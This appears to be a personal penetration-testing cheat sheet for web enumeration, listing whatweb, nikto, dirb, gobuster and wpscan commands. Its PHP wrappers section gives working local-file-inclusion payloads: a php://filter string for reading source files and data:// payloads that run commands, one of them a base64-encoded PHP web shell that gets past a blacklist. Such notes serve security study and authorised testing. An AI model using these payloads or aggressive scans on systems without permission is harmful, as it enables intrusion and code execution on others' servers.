Subdomains: [getSubdomains.sh](file:////home/kali/Documents/passiveInformationGathering/)
Get pictures to multiple websites: [ip2webOverview.sh](file:////home/kali/Documents/passiveInformationGathering/)
##### Technologies
```bash
whatweb -v -a 3 $hip:80
```
##### Nikto
```bash
nikto -host=http://$hip/ | tee nikto.txt
```
`-T` for smaller test, `-maxtime=30s` for setting maxtime
##### DIRB
```bash
dirb http://$hip:80 -S | tee dirb.txt
```
Try whether interactively works better for me, so that it does not waste time going into all wordpress dirs
##### Gobuster
```bash
gobuster dir -u http://$hip -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt -x txt,pdf,config 
```
Alternative to DIRB
##### Files of possible relevance
`/robots.txt` , `/crossdomain.xml` `/clientaccesspolicy.xml` `/sitemap.xml` and `/.well-known/`

#### Search for interesting files
```bash
tree $folder | grep -v ".php" | grep -v ".js" | grep -v ".css" | tee >(wc -l)
```

##### Host php files locally to try them
```bash
php -S 127.0.0.1:8000
```

##### PHP Wrappers
You can use a LFI to:
- read files, e.g. admin.php with `index.php?page=php://filter/convert.base64-encode/resource=admin.php` , then decode base64 by piping it to `base64 -d`
- execute commands if _allow_url_include_ is enabled with `index.php?page=data://text/plain,<?php%20echo%20system('ls');?>` (or `data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"` if the string "system" is blacklisted).
##### Yet-to-try:
Check potential vulnerable urls with https://github.com/1ndianl33t/Gf-Patterns
https://github.com/stevenvachon/broken-link-checker
https://github.com/projectdiscovery/nuclei-templates/tree/4e3f843e15c68f816f0ef6abce5d30b6cf6d4a30/exposures/tokens


## WPSCAN
##### Extended scan:
```bash
wpscan --url "https://$hip:80" --detection-mode aggressive --plugins-detection aggressive --disable-tls-checks --enumerate ap,vt,cb,dbe | tee wpscan_extended.txt
```
##### Fast Scan
```bash
wpscan --url "https://$hip:80" --detection-mode aggressive --plugins-detection aggressive --disable-tls-checks --enumerate p,vt,cb,dbe
```
